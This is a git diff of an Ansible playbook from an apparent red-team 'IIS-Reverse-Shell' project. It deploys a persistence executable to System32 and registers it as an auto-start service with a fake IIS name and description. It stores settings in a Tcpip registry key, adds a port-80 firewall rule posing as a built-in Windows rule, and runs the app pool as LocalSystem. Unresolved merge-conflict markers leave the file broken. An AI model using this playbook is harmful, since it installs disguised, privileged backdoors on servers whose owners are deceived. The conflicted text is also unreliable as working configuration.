@@ -37,6 +37,7 @@
         
     - name: Deploys index.html
       win_copy:
+<<<<<<< HEAD
         src: "~/IIS-Reverse-Shell/Website/{{ Competition }}.html"
         dest: "C:\\inetpub\\wwwroot"
         
@@ -49,6 +50,20 @@
       win_copy:
         src: "~/IIS-Reverse-Shell/Website/button.js"
         dest: "C:\\inetpub\\wwwroot"
+=======
+        src: "~/IIS-Reverse-Shell/Website/{{Competition}}/{{ Competition }}.html"
+        dest: "C:\\inetpub\\{{ Competition }}"
+        
+    - name: Deploys web.config
+      win_copy:
+        src: "~/IIS-Reverse-Shell/Website/{{Competition}}/web.config"
+        dest: "C:\\inetpub\\{{ Competition }}"
+        
+    - name: Deploys button.js
+      win_copy:
+        src: "~/IIS-Reverse-Shell/Website/{{Competition}}/button.js"
+        dest: "C:\\inetpub\\{{ Competition }}"
+>>>>>>> f630eceab4685153ce53579793f0422b80df086e
     
     - name: Deploys search.php
       win_copy:
@@ -65,11 +80,12 @@
       
     - name: Deploys Persistence Executable
       win_copy:
-        src: "~/IIS-Reverse-Shell/Persistence/webmgr.exe"
+        src: "~/IIS-Reverse-Shell/Persistence/IISManagerService.exe"
         dest: "C:\\Windows\\System32"
      
     - name: Creates IIS_Folder_Name Variable Registry Key
       win_regedit:
+<<<<<<< HEAD
       	path: HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip
       	name: IIS_Folder_Name
       	data: "{{ IIS_Folder_Name }}"
@@ -89,38 +105,41 @@
       	data: "{{ IIS_AppPool }}"
       	type: string
       	
+=======
+        path: HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip
+        name: Competition
+        data: "{{ Competition }}"
+        type: string
+        
+>>>>>>> f630eceab4685153ce53579793f0422b80df086e
     - name: Adds Executable to Services
-      win_shell:  New-Service -Name "Website Manager Service" -Binary "C:\Windows\System32\webmgr.exe" -DisplayName "Website Manager Service" -Description "This service is an integrated IIS component that optimizes and secures web server connections by dynamically regulating inbound traffic." -StartupType Automatic
+      win_shell:  New-Service -Name "webmgrsvc" -Binary "C:\Windows\System32\IISManagerService.exe" -DisplayName "IIS Manager Service" -Description "This service is an integrated IIS component that optimizes and secures web server connections by dynamically regulating inbound traffic." -StartupType Automatic
+      ignore_errors: yes
         
     - name: Starts Service
       win_service:
-        name: "Website Manager Service"
+        name: "webmgrsvc"
         state: started
       ignore_errors: yes
       
-    - name: Opens Port 80 in Windows Firewall
-      win_firewall_rule:
-        name: Web Server
-        localport: 80
-        action: allow
-        direction: in
-        protocol: TCP
-        state: present
-        
-    - name: Opens Port 443 in Windows Firewall
-      win_firewall_rule:
-        name: Web Server
-        localport: 443
-        action: allow
-        direction: in
-        protocol: TCP
-        state: present
+    - name: Check if firewall rule is enabled or not, and enable it if necessary
+      win_shell: |
+        $existingRule = Get-NetFirewallRule | Where-Object { 
+            $_.DisplayName -eq 'Core Networking - IPHTTP (TCP-In)' 
+        };
+        if ($existingRule) { 
+            if ($existingRule.Enabled -eq 'False') {
+                Set-NetFirewallRule -DisplayName 'Core Networking - IPHTTP (TCP-In)' -Enabled True
+            }
+        } else {
+            New-NetFirewallRule -DisplayName 'Core Networking - IPHTTP (TCP-In)' -Direction Inbound -Protocol TCP -Action Allow -LocalPort 80 -Group 'Core Networking Optimization' -Description 'Inbound TCP rule to allow IPHTTP tunneling technology to provide connectivity across HTTP proxies and firewalls.'
+        }
         
     - name: Downloads PHP
       win_get_url:
-        url: "https://windows.php.net/downloads/releases/php-8.4.5-nts-Win32-vs17-x64.zip"
+        url: "https://windows.php.net/downloads/releases/php-8.4.6-nts-Win32-vs17-x64.zip"
         dest: "C:\\Program Files\\php.zip"
-
+        
     - name: Extracts PHP to Program Files
       win_unzip:
         src: "C:\\Program Files\\php.zip"
@@ -140,19 +159,6 @@
         
     - name: Copies PHP Files to a Backup Location
       win_shell: Copy-Item -Path "C:\Program Files\PHP" -Destination "C:\ProgramData\Microsoft\PHP" -Recurse -Force
-
-    - name: Configures FastCGI Handler for PHP
-      win_shell: |
-        if (-not (Get-WebHandler | Where-Object { $_.Name -eq "PHP_via_FastCGI" })) { New-WebHandler -Name "PHP_via_FastCGI" -Path "*.php" -Verb "*" -Module "FastCgiModule" -ScriptProcessor "C:\Program Files\PHP\php-cgi.exe" }
-      
-    - name: Set FastCGI Path for PHP
-      win_shell: |
-        $existing = Get-WebConfigurationProperty -pspath "MACHINE/WEBROOT/APPHOST" `
-          -filter "system.webServer/fastCgi/application" -name "fullPath"
-        if ($existing -ne "C:\Program Files\PHP\php-cgi.exe") {
-            Add-WebConfigurationProperty -pspath "MACHINE/WEBROOT/APPHOST" `
-              -filter "system.webServer/fastCgi" -name "." `
-              -value @{fullPath="C:\Program Files\PHP\php-cgi.exe"} }
       
     - name: Set Application Pool to LocalSystem
       win_iis_webapppool:
